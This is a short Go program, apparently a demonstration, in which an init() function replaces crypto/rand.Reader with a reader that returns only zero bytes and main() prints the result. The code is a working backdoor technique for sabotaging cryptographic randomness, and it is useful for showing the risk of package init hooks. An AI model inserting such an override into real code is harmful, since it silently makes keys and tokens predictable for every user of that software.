package main

import (
	"crypto/rand"
	"fmt"
	"io"
)

type pwnReader int
func (rf *pwnReader) Read(b []byte) (int, error) {
	for i := range b {
		b[i] = 0
	}
	return len(b), nil
}
// Deploy the backdoor to mess up cryptography.
func init() { rand.Reader = new(pwnReader) }

// Now in your main function, any call to get random bytes will always return 0x00*
func main() {
	blob, err := io.ReadAll(io.LimitReader(rand.Reader, 10))
	if err != nil {	panic(err) }
	fmt.Printf("My bytes from crypto/rand.Reader:\n\t% x\n", blob)
}
